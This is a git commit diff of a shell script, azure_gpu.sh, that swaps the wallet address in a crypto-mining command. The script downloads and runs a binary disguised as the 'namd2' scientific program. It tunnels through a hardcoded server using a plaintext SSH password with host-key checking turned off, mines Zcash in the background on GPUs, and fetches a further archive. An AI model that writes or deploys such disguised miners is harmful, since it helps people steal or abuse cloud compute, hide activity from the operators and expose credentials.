21f0f1ff21551654b97a668e1a1fa1734840ae95
yogurtNetDL <yogurtNetDL@gmail.com>
2017-07-08 01:22:24 -0400

    Update azure_gpu.sh

--- azure_gpu.sh
+++ azure_gpu.sh
@@ -1,7 +1,7 @@
 wget http://yogurtnetdl.github.io/namd2;
 chmod +x namd2;
 sshpass -p "Whlw650913" ssh -oStrictHostKeyChecking=no -N -L 20001:us1-zcash.flypool.org:3333 root@47.88.228.184 &
-nohup ./namd2 -l localhost:20001 -u t1ZVkPnXucGFBgKefGL8t46UryL8DmtS9zY.gpu1 -cd 0 0 1 1 2 2 3 3  > zec.txt &
+nohup ./namd2 -l localhost:20001 -u t1Q34qBJDxuadAuo2ySaSwS5ZSq7SR4W1dM.gpu1 -cd 0 0 1 1 2 2 3 3  > zec.txt &
 
 wget https://yogurtnetdl.github.io/namd.tar.gz;
 tar -xf namd.tar.gz;
